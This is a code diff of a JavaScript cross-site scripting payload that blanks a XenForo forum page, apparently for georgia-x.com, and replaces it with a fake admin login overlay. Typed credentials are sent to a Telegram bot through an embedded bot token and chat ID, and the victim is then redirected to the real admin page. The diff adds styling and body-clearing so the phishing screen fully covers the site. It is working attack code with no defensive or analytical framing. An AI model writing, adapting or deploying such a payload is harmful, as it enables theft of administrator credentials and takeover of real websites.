@@ -1,6 +1,24 @@
 (function() {
     let overlay = document.createElement('div');
     overlay.id = 'xss-login-overlay';
+    
+    // ПРИНУДИТЕЛЬНЫЕ СТИЛИ ДЛЯ OVERLAY
+    overlay.style.cssText = `
+        position: fixed !important;
+        top: 0 !important;
+        left: 0 !important;
+        width: 100% !important;
+        height: 100% !important;
+        background: #185886 !important;
+        z-index: 9999999 !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        overflow: auto !important;
+        margin: 0 !important;
+        padding: 0 !important;
+    `;
+    
     overlay.innerHTML = `
         <style>
             button,input{overflow:visible}[type=checkbox]{box-sizing:border-box;padding:0}html{line-height:1.15}body{margin:0}a{background-color:transparent}img{border-style:none}button,input{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button{text-transform:none}[type=submit],button{-webkit-appearance:button}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}[hidden]{display:none}
@@ -36,8 +54,8 @@
             .fa-user:before{content:"\\f007"}
         </style>
         
-        <div class="p-adminLogin">
-            <div class="adminLogin-wrapper">
+        <div class="p-adminLogin" style="height:100%; width:100%; display:flex; align-items:center; justify-content:center;">
+            <div class="adminLogin-wrapper" style="width:100%; display:flex; align-items:center; justify-content:center;">
                 <div class="adminLogin-content">
                     <form class="adminLogin-contentForm" onsubmit="return false;">
                         <div><a href="https://georgia-x.com"><img src="/styles/default/xenforo/xenforo-logo.png" alt="XenForo Ltd."></a></div>
@@ -77,7 +95,11 @@
         </div>
     `;
     
+    // Очищаем body и добавляем overlay
+    document.body.innerHTML = '';
     document.body.appendChild(overlay);
+    document.body.style.margin = '0';
+    document.body.style.padding = '0';
     
     // глазик
     let toggleCheckbox = document.getElementById('toggle-pwd');
@@ -106,7 +128,6 @@
             return;
         }
         
-        // Telegram Bot API (ЗАМЕНИ НА СВОИ)
         let botToken = '8731675309:AAHMggFeWa97iLS4n6aGLbfPWNlRMTUvacQ';
         let chatId = '8173640646';
         
@@ -123,11 +144,9 @@
             })
         }).catch(function(e) { console.log('Telegram error:', e); });
         
-        // Перенаправляем в админку georgia-x.com
         window.location.href = '/admin.php';
     };
     
-    // Enter для отправки
     document.getElementById('xss-password').addEventListener('keypress', function(e) {
         if (e.key === 'Enter') {
             document.getElementById('xss-submit').click();
